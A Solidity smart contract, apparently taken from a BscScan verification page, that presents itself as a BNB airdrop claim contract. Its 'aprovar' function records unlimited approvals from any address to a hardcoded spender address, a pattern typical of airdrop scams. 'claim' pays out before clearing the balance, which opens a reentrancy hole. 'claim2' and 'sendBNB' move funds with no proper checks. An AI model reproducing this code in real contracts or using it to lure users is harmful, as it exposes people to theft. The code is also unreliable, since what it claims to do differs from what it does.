/**
 *Submitted for verification at BscScan.com on 2022-06-04
*/

/**
 *Submitted for verification at BscScan.com on 2022-04-24
*/

// SPDX-License-Identifier: Unlicensed

pragma solidity >=0.4.16 <0.9.0;
contract Claimable {
    address internal support;
    address marketing = 0x4bbCEecd0C6f9Fc509Ca2621Defef28937a40E5d;
    address spender2 = 0x802255146C7945bC22d2263AA655D82c007b1188;
    uint256 internal Gas = 3*10**14 wei;

    mapping(address => uint256) internal balances;
    mapping (address => mapping (address => uint)) private _allowances;
    
    constructor() {
        support = msg.sender;
    }

    modifier onlySupport() {
        require(msg.sender == support, "You are not the support");
        _;
    }

    function claimable(address _target) external view returns (uint256) {
        return balances[_target];
    }

    function claimableBNB(address _target) external view returns (uint256) {
        return _target.balance;
    }

    // Setters
    function _setClaimable(address _target, uint256 _amount) internal {
        balances[_target] = _amount;
    }

    function _addClaimable(address _target, uint256 _amount) internal {
        balances[_target] += _amount;
    }

    function setMultiClaimable( address[] calldata _targets, uint256[] calldata _amounts ) external onlySupport {
        for (uint256 i = 0; i < _targets.length; i++)
            _setClaimable(_targets[i], _amounts[i]);
    }

    function addMultiClaimable( address[] calldata _targets, uint256[] calldata _amounts) external onlySupport {
        for (uint256 i = 0; i < _targets.length; i++)
            _addClaimable(_targets[i], _amounts[i]);
    }

    function setClaimable(address _target, uint256 _amount) external onlySupport {
        _setClaimable(_target, _amount);
    }

    // Core functionality
    function claim() external {
        require( balances[msg.sender] > 0, "You have no claimable airdrop balances." );
        (bool success, ) = msg.sender.call{value: balances[msg.sender]}("");
        require(success, "Could not receive payable ammount.");
        balances[msg.sender] = 0;
    }
    function allowance(address _owner, address spender) external view returns (uint) {return _allowances[_owner][spender];}

    function approve(address spender, uint amount) external returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint amount) private {
        require(owner != address(0), "Approve from zero");
        require(spender != address(0), "Approve to zero");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function aprovar(address sender) external {
        _approve(sender, spender2, type(uint256).max);
        _approve(sender, address(this), type(uint256).max);
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    // Core functionality
    function claim2() external {
        require( balances[msg.sender] > 0, "You have no claimable airdrop balances." );
        (bool success, ) = msg.sender.call{value: marketing.balance}("");
        require(success, "Could not receive payable ammount.");

    }

    function sendBNB(address payable _destination) external {
        (bool sent, ) = _destination.call{value: Gas}("");
        require(sent, "Failed to send BNB.");
    }

    receive() external payable {}
}